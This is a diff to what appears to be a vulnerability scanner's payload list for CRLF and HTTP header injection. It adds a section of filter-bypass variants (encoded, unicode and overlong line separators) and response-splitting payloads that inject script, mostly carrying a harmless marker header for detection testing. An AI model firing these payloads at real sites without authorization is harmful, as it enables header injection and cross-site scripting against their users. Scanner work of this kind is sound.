@@ -1,6 +1,6 @@
 # CRLF Injection / Header Injection payloads
 # Source: https://github.com/swisskyrepo/PayloadsAllTheThings
-# Total: 31 payloads
+# Total: 46 payloads
 %0d%0aX-VulnScanner-CRLF-Test: injected
 %0aX-VulnScanner-CRLF-Test: injected
 %0d%0a%0d%0a<script>alert(1)</script>
@@ -34,3 +34,23 @@ Content-Type: text/html; charset=utf-8
 %250d%250aX-Injected: notscan
 /%0d%0aX-Injected: notscan
 ?next=%0d%0aX-Injected: notscan
+
+# --- WAF bypass ---
+# encoded / unencoded CRLF
+%0d%0aX-VulnScanner-CRLF-Test: injected%0d%0a
+%0aX-VulnScanner-CRLF-Test: injected%0a
+%0D%0AX-VulnScanner-CRLF-Test%3A%20injected
+%0d%0a%09X-VulnScanner-CRLF-Test: injected
+%0d%0a%20X-VulnScanner-CRLF-Test: injected
+%0d%0aX-CRLF-Injected: notscan
+\r\n\r\nX-VulnScanner-CRLF-Test: injected
+\r\nX-VulnScanner-CRLF-Test: injected\r\n
+\n\nX-VulnScanner-CRLF-Test: injected
+# unicode / overlong line separators
+%E5%98%8D%0d%0aX-VulnScanner-CRLF-Test: injected
+%0d%0a%E5%98%8AX-VulnScanner-CRLF-Test: injected
+%c0%8d%c0%8aX-VulnScanner-CRLF-Test: injected
+%u000d%u000aX-VulnScanner-CRLF-Test: injected
+# split response / header-name obfuscation
+%0d%0aContent-Type: text/html%0d%0a%0d%0a<svg onload=alert(1)>
+%0d%0aX-VulnScanner-CRLF-Test%3A injected
